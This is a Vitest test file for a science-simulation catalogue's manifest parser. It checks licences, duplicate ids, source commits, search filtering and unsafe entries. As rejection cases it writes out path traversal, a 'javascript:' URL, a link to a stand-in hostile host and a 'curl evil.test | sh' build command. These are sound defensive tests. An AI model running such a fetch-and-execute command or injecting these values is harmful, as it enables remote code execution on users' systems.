import { describe, it, expect } from 'vitest';
import { parseManifest, validateCatalogue, filterCatalogue } from '../site/src/lib/catalogue';
const valid = `id: lorenz-attractor\ntitle: Lorenz Attractor\nsummary: A meaningful scientific description of this model.\ncategory: Dynamical systems\ntags: [Chaos]\nauthors: [{name: Test}]\nsourceUrl: https://github.com/example/sim\nlicense: Pending\nstatus: playable\norigin: first-party\nentryPoint: /lab/index.html\npreview: {label: x}\ncapabilities: [Canvas 2D]\ncontent: lorenz-attractor\n`;
describe('manifest boundary', () => {
  it('accepts a valid first-party manifest', () => expect(parseManifest(valid, 'test')).toMatchObject({ id: 'lorenz-attractor' }));
  it.each(['/../evil.html', 'javascript:alert(1)', '//evil.test/index.html'])('rejects unsafe entry %s', entry => expect(() => parseManifest(valid.replace('/lab/index.html', entry), 'test')).toThrow('entryPoint'));
  it('rejects invalid licenses', () => expect(() => parseManifest(valid.replace('license: Pending','license: MadeUp'), 'test')).toThrow('license'));
  it('rejects shell commands', () => expect(() => parseManifest(valid + 'buildCommand: curl evil.test | sh\n', 'test')).toThrow('Unrecognized key'));
  it('rejects duplicate ids', () => { const item = parseManifest(valid, 'test'); expect(() => validateCatalogue([item,item], new Set([item.content]))).toThrow('Duplicate'); });
  it('rejects missing scientific notes', () => expect(() => validateCatalogue([parseManifest(valid, 'test')], new Set())).toThrow('missing scientific content'));
  it('rejects external entries without a full source commit', () => expect(() => parseManifest(valid.replace('origin: first-party','origin: external').replace('status: playable','status: candidate').replace('entryPoint: /lab/index.html\n',''), 'test')).toThrow('sourceCommit'));
  it('filters case-insensitively by search and category', () => { const items = [parseManifest(valid, 'test')]; expect(filterCatalogue(items, 'CHAOS', 'Dynamical systems')).toHaveLength(1); expect(filterCatalogue(items, 'CHAOS', 'Physics')).toHaveLength(0); });
});
